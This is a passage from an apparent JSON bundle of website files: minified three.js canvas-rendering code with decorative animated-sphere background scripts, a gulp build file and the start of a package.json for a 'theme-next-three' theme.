$=1/Ee.w;Ee.z*=$,-1<=Ee.z&&Ee.z<=1&&((re=He()).id=s.id,re.x=Ee.x*$,re.y=Ee.y*$,re.z=Ee.z,re.renderOrder=s.renderOrder,re.object=s,re.rotation=s.rotation,re.scale.x=s.scale.x*Math.abs(re.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),re.scale.y=s.scale.y*Math.abs(re.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),re.material=s.material,ce.elements.push(re))}}return!0===r&&ce.elements.sort(ge),ce}};\n(function(){var s,l,c,t=0,i=0,r=window.innerWidth/2,n=window.innerHeight/2;function p(){r=window.innerWidth/2,n=window.innerHeight/2,s.aspect=window.innerWidth/window.innerHeight,s.updateProjectionMatrix(),c.setSize(window.innerWidth,window.innerHeight)}function E(e){t=e.clientX-r,i=e.clientY-n}function d(e){1<e.touches.length&&(t=e.touches[0].pageX-r)}function h(e){1==e.touches.length&&(t=e.touches[0].pageX-r)}function o(){s.position.x+=.05*(t-s.position.x),s.position.y+=.05*(200-i-s.position.y),s.lookAt(l.position),c.render(l,s)}!function(){var e,t;(e=document.createElement(\"div\")).style.position=\"fixed\",e.style.top=\"0px\",e.style.left=\"0px\",e.style.zIndex=\"-1\",e.style.opacity=\"0.5\",document.body.appendChild(e),(s=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,1,1e4)).position.z=100,l=new THREE.Scene,(c=new THREE.CanvasRenderer({alpha:!0})).setPixelRatio(window.devicePixelRatio),c.setSize(window.innerWidth,window.innerHeight),e.appendChild(c.domElement);for(var i=2*Math.PI,r=new THREE.SpriteCanvasMaterial({color:10263708,program:function(e){e.beginPath(),e.arc(0,0,.5,0,i,!0),e.fill()}}),n=new THREE.Geometry,o=0;o<100;o++)(t=new THREE.Sprite(r)).position.x=2*Math.random()-1,t.position.y=2*Math.random()-1,t.position.z=2*Math.random()-1,t.position.normalize(),t.position.multiplyScalar(10*Math.random()+450),t.scale.x=t.scale.y=10,l.add(t),n.vertices.push(t.position);var a=new THREE.Line(n,new THREE.LineBasicMaterial({color:10263708,opacity:.5}));l.add(a),document.addEventListener(\"mousemove\",E,!1),document.addEventListener(\"touchstart\",d,!1),document.addEventListener(\"touchmove\",h,!1),window.addEventListener(\"resize\",p,!1)}(),function e(){requestAnimationFrame(e);o()}()})();\n"},{"url":"/lib/three/canvas_sphere.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,h,f,u,m,v,R,x,y,T,w,H,g,S,M=this,b=new THREE.Projector,i=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=i.width,z=i.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=i.getContext(\"2d\",{alpha:!0===e.alpha}),r=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,X=new THREE.Color,J={},Y=new THREE.Box2,$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,re=new THREE.Vector3,ie=new THREE.Matrix3;function ne(e,t,r){de(r.opacity),he(r.blending);var i=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(i*i+n*n);if(K.min.set(e.x-o,e.y-o),K.max.set(e.x+o,e.y+o),r instanceof THREE.SpriteMaterial){var a=r.map;if(null!==a){var s=J[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),J[a.id]=s),void 0!==s.canvas){Re(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,h=i/E,f=n/d;P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.translate(-i/2,-n/2),P.scale(h,f),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else Re(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else r instanceof THREE.SpriteCanvasMaterial&&(ve(r.color.getStyle()),Re(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,n),r.program(P),P.restore())}function oe(e,t,r,i){if(de(i.opacity),he(i.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),i instanceof THREE.LineBasicMaterial){if(fe(i.linewidth),ue(i.linecap),me(i.linejoin),i.vertexColors!==THREE.VertexColors)ve(i.color.getStyle());else{var n=r.vertexColors[0].getStyle(),o=r.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),K.expandByScalar(2*i.linewidth)}else i instanceof THREE.LineDashedMaterial&&(fe(i.linewidth),ue(i.linecap),me(i.linejoin),ve(i.color.getStyle()),xe([i.dashSize,i.gapSize]),P.stroke(),K.expandByScalar(2*i.linewidth),xe([]))}function ae(e,t,r,i,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),he(s.blending),h=e.positionScreen.x,f=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=r.positionScreen.x,R=r.positionScreen.y,function(e,t,r,i,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(r,i),P.lineTo(n,o),P.closePath()}(h,f,u,m,v,R),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Q),te.copy(e.positionWorld).add(t.positionWorld).add(r.positionWorld).divideScalar(3),function(e,t,r){for(var i=0,n=c.length;i<n;i++){var o=c[i];if(X.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,r.add(X.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,r.add(X.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(x=a.uvs,pe(h,f,u,m,v,R,x[i].x,x[i].y,x[n].x,x[n].y,x[o].x,x[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(re.copy(a.vertexNormalsModel[i]).applyMatrix3(ie),y=.5*re.x+.5,T=.5*re.y+.5,re.copy(a.vertexNormalsModel[n]).applyMatrix3(ie),w=.5*re.x+.5,H=.5*re.y+.5,re.copy(a.vertexNormalsModel[o]).applyMatrix3(ie),g=.5*re.x+.5,S=.5*re.y+.5,pe(h,f,u,m,v,R,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(re.copy(a.normalModel).applyMatrix3(ie),G.setRGB(re.x,re.y,re.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,r,i){fe(t),ue(r),me(i),ve(e.getStyle()),P.stroke(),K.expandByScalar(2*t)}function le(e){Re(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var r=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,i=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==r&&!0==i?l=\"repeat\":!0==r?l=\"repeat-x\":!0==i&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,r,i,n,o,a,s,l,c,p,E,d){var h=J[d.id];if(void 0!==h&&h.version===d.version||(h=ce(d),J[d.id]=h),void 0===h.canvas)return Re(\"rgba( 0, 0, 0, 1)\"),void P.fill();Re(h.canvas);var f,u,m,v,R,x,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,r-=e,i-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(R=e-(f=(E*r-c*n)*(T=1/y))*a-(m=(l*n-p*r)*T)*s,x=t-(u=(E*i-c*o)*T)*a-(v=(l*o-p*i)*T)*s,P.save(),P.transform(f,u,m,v,R,x),P.fill(),P.restore())}function Ee(e,t,r){var i,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=i=r/Math.sqrt(a),o*=i,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function he(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function fe(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function Re(e){F!==e&&(P.fillStyle=e,F=e)}function xe(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=i,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,r){C=e*n,z=t*n,i.width=C,i.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==r&&(i.style.width=e+\"px\",i.style.height=t+\"px\"),Y.min.set(-V,-j),Y.max.set(V,j),$.min.set(-V,-j),$.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,r,i){L=e*n,O=t*n,B=r*n,W=i*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){r.set(e),o=void 0!==t?t:1,$.min.set(-V,-j),$.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return r},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===$.isEmpty()&&($.intersect(Y),$.expandByScalar(2),$.min.x=$.min.x+V,$.min.y=-$.min.y+j,$.max.x=$.max.x+V,$.max.y=-$.max.y+j,o<1&&P.clearRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0),0<o&&(he(THREE.NormalBlending),de(1),Re(\"rgba(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\",\"+o+\")\"),P.fillRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0)),$.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var r=e.background;r&&r.isColor?(Re(\"rgb(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,ie.getNormalMatrix(t.matrixWorldInverse),function(){Q.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var r=c[e],i=r.color;r instanceof THREE.AmbientLight?Q.add(i):r instanceof THREE.DirectionalLight?Z.add(i):r instanceof THREE.PointLight&&_.add(i)}}();for(var i=0,n=l.length;i<n;i++){var o=l[i],a=o.material;if(void 0!==a&&0!==a.opacity){if(K.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,K.setFromPoints([p.positionScreen,E.positionScreen]),!0===Y.intersectsBox(K)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),K.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===Y.intersectsBox(K)&&ae(p,E,d,0,1,2,o,a)}$.union(K)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var K,Q,n,Z,_,ee,te,re,ie,ne,oe,ae=[],se=0,le=[],t=0,r=[],i=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),he=new THREE.Matrix4,fe=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,Re=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var xe=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function i(e){var t=e.position,r=e.positionWorld,i=e.positionScreen;r.copy(t).applyMatrix4(oe),i.copy(r).applyMatrix4(he);var n=1/i.w;i.x*=n,i.y*=n,i.z*=n,e.visible=-1<=i.x&&i.x<=1&&-1<=i.y&&i.y<=1&&-1<=i.z&&i.z<=1}function h(e,t,r){return!0===e.visible||!0===t.visible||!0===r.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=r.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function f(e,t,r){return(r.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(r.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:i,checkTriangleVisibility:h,checkBackfaceCulling:f,pushVertex:function(e,t,r){(n=ye()).position.set(e,t,r),i(n)},pushNormal:function(e,t,r){l.push(e,t,r)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var r=le[e],i=le[t];(te=we()).id=p.id,te.v1.copy(r),te.v2.copy(i),te.z=(r.positionScreen.z+i.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,r){var i=le[e],n=le[t],o=le[r];if(!1!==h(i,n,o)&&(E.side===THREE.DoubleSide||!0===f(i,n,o))){(_=Te()).id=p.id,_.v1.copy(i),_.v2.copy(n),_.v3.copy(o),_.z=(i.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==i)return r[ee++];var e=new THREE.RenderableFace;return r.push(e),i++,ee++,e}function we(){if(re!==a)return o[re++];var e=new THREE.RenderableLine;return o.push(e),a++,re++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var r=0,i=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?r=Math.max(r,n/(n-o)):o<0&&(i=Math.min(i,n/(n-o))),a<0?r=Math.max(r,a/(a-s)):s<0&&(i=Math.min(i,a/(a-s))),!(i<r)&&(e.lerp(t,r),t.lerp(e,1-i),!0))}this.projectScene=function(e,t,r,i){function n(e){(K=function(){if(Q!==se)return ae[Q++];var e=new THREE.RenderableObject;return ae.push(e),se++,Q++,e}()).id=e.id,K.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(he),K.z=pe.z,K.renderOrder=e.renderOrder,ce.objects.push(K)}ne=re=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),he.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(he),Q=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===r&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(xe.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(J=c.position.array).length;E<d;E+=3)xe.pushVertex(J[E],J[E+1],J[E+2]);if(void 0!==c.normal){var h=c.normal.array;for(E=0,d=h.length;E<d;E+=3)xe.pushNormal(h[E],h[E+1],h[E+2])}if(void 0!==c.uv){var f=c.uv.array;for(E=0,d=f.length;E<d;E+=2)xe.pushUv(f[E],f[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)xe.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)xe.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=J.length/3;E<d;E+=3)xe.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var R=l.vertices,x=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=R.length;g<S;g++){var M=R[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}xe.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=x.length;O<B;O++){var W=x[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==xe.checkTriangleVisibility(k,N,F)){var A=xe.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var X=0;X<3;X++)_.uvs[X].copy(q[X]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var J;for(E=0,d=(J=c.position.array).length;E<d;E+=3)xe.pushVertex(J[E],J[E+1],J[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)xe.pushLine(u[E],u[E+1]);else{var Y=s instanceof THREE.LineSegments?2:1;for(E=0,d=J.length/3-1;E<d;E+=Y)xe.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(fe.multiplyMatrices(he,oe),0===(R=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(R[0]).applyMatrix4(fe);for(Y=s instanceof THREE.LineSegments?2:1,g=1,S=R.length;g<S;g++)(k=ye()).positionScreen.copy(R[g]).applyMatrix4(fe),0<(g+1)%Y||(N=le[Z-2],ve.copy(k.positionScreen),Re.copy(N.positionScreen),!0===Se(ve,Re)&&(ve.multiplyScalar(1/ve.w),Re.multiplyScalar(1/Re.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(Re),te.z=Math.max(ve.z,Re.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(he);var $=1/Ee.w;Ee.z*=$,-1<=Ee.z&&Ee.z<=1&&((ie=He()).id=s.id,ie.x=Ee.x*$,ie.y=Ee.y*$,ie.z=Ee.z,ie.renderOrder=s.renderOrder,ie.object=s,ie.rotation=s.rotation,ie.scale.x=s.scale.x*Math.abs(ie.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),ie.scale.y=s.scale.y*Math.abs(ie.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),ie.material=s.material,ce.elements.push(ie))}}return!0===i&&ce.elements.sort(ge),ce}};\n(function(){var c,p,E,d=window.innerWidth,h=window.innerHeight,t=0,r=0,i=window.innerWidth/2,n=window.innerHeight/2;function f(){i=window.innerWidth/2,n=window.innerHeight/2,c.aspect=window.innerWidth/window.innerHeight,c.updateProjectionMatrix(),E.setSize(window.innerWidth,window.innerHeight)}function u(e){t=e.clientX-i,r=e.clientY-n}function m(e){1<e.touches.length&&(t=e.touches[0].pageX-i)}function v(e){1==e.touches.length&&(t=e.touches[0].pageX-i)}function o(){c.position.x+=.05*(t-c.position.x),c.position.y+=.05*(200-r-c.position.y),c.lookAt(p.position),E.render(p,c)}!function(){var e,t;(e=document.createElement(\"div\")).style.position=\"fixed\",e.style.top=\"0px\",e.style.left=\"0px\",e.style.zIndex=\"-1\",e.style.opacity=\"0.5\",document.body.appendChild(e),(c=new THREE.PerspectiveCamera(75,d/h,1,1e4)).position.z=1e3,p=new THREE.Scene,(E=new THREE.CanvasRenderer({alpha:!0})).setPixelRatio(window.devicePixelRatio),E.setSize(d,h),e.appendChild(E.domElement);for(var r=2*Math.PI,i=new THREE.SpriteCanvasMaterial({color:10263708,program:function(e){e.beginPath(),e.arc(0,0,.5,0,r,!0),e.fill()}}),n=0;n<1e3;n++)(t=new THREE.Sprite(i)).position.x=2*Math.random()-1,t.position.y=2*Math.random()-1,t.position.z=2*Math.random()-1,t.position.normalize(),t.position.multiplyScalar(10*Math.random()+450),t.scale.multiplyScalar(2),p.add(t);for(n=0;n<300;n++){var o=new THREE.Geometry,a=new THREE.Vector3(2*Math.random()-1,2*Math.random()-1,2*Math.random()-1);a.normalize(),a.multiplyScalar(450),o.vertices.push(a);var s=a.clone();s.multiplyScalar(.3*Math.random()+1),o.vertices.push(s);var l=new THREE.Line(o,new THREE.LineBasicMaterial({color:10263708,opacity:Math.random()}));p.add(l)}document.addEventListener(\"mousemove\",u,!1),document.addEventListener(\"touchstart\",m,!1),document.addEventListener(\"touchmove\",v,!1),window.addEventListener(\"resize\",f,!1)}(),function e(){requestAnimationFrame(e);o()}()})();\n"},{"url":"/lib/three/gulpfile.js","content":"const fs = require('fs')\nconst del = require('del')\nconst gulp = require('gulp')\nconst concat = require('gulp-concat')\nconst uglify = require('gulp-uglify')\n\ngulp.task('clean', async () => {\n  del(['*.min.js', '!three.min.js'])\n})\n\ngulp.task('scripts', async () => {\n  const sourceFiles = fs.readdirSync('src')\n  sourceFiles.forEach(file => {\n    const fileName = file.split('.')[0]\n    return gulp.src([`src/${fileName}.js`, 'lib/*.js'])\n      .pipe(concat(`${fileName}.min.js`))\n      .pipe(uglify())\n      .pipe(gulp.dest('./'))\n  })\n})\n\ngulp.task('default', gulp.series('clean', 'scripts'))"},{"url":"/lib/three/package.json","content":"{\n  \"name\": \"theme-next-three\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\",\n  \"repository\": 